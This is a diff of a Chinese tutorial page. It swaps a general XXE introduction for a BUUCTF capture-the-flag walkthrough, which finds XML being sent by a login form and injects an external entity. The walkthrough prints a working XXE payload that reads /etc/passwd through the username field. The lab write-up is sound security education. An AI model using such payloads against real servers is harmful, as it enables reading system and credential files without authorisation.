@@ -3,13 +3,50 @@ comments: true
 
 ---
 
-# XXE (XML External Entity) 
+# XXE注入
 
-## 简介
+<!-- Imported from D:\\Book\\Web\\Chapter16\16-1.md -->
+### 文件读取注入
 
-XML External Entity (XXE) 是一种利用 XML 解析器漏洞的攻击技术。通过利用 XXE 漏洞，攻击者可以访问服务器文件系统，执行远程代码，或实施其他恶意行为。本文将介绍 XXE 攻击的基本原理、常见的攻击手法以及防御措施。
+话不多说，直接上题（BUUCTF）
 
-## 什么是 XXE 攻击
+![](https://pic1.imgdb.cn/item/67b17bbad0e0a243d4ffc3a1.jpg)
 
-XXE 攻击是一种基于 XML 的攻击技术，攻击者通过在 XML 文档中注入外部实体 (External Entity)，诱使 XML 解析器读取或解析不应该访问的资源。常见的外部实体包括文件、网络资源等。
+打开网页是登录页面
 
+![](https://pic1.imgdb.cn/item/67b17be9d0e0a243d4ffc3a4.png)
+
+查看网页源代码发现 ajax 发送的是 xml 形式的数据，应该存在 XXE 注入
+
+![](https://pic1.imgdb.cn/item/67b17c04d0e0a243d4ffc3a9.jpg)
+
+打开 BurpSuite 抓包请求确定是 xml 格式
+
+![](https://pic1.imgdb.cn/item/67b17c74d0e0a243d4ffc3e9.jpg)
+
+构造 payload，如图中的 xml 格式
+
+第一行先声明 XML 的版本（1.0）和编码（UTF-8）
+
+然后声明 DOCTYPE，名字自取
+
+然后再声明 ENTITY，名字自取
+
+```xml
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE note[
+    <!ENTITY admin SYSTEM "file:///etc/passwd">
+    ]>
+<user>
+    <username>
+        &admin;
+    </username>
+    <password>
+        123
+    </password>
+</user>
+```
+
+SYSTEM 标识符表示外部实体引用一个外部资源，可以是文件或 URL，传过去拿到 flag
+
+![](https://pic1.imgdb.cn/item/67b17d15d0e0a243d4ffc3f8.jpg)
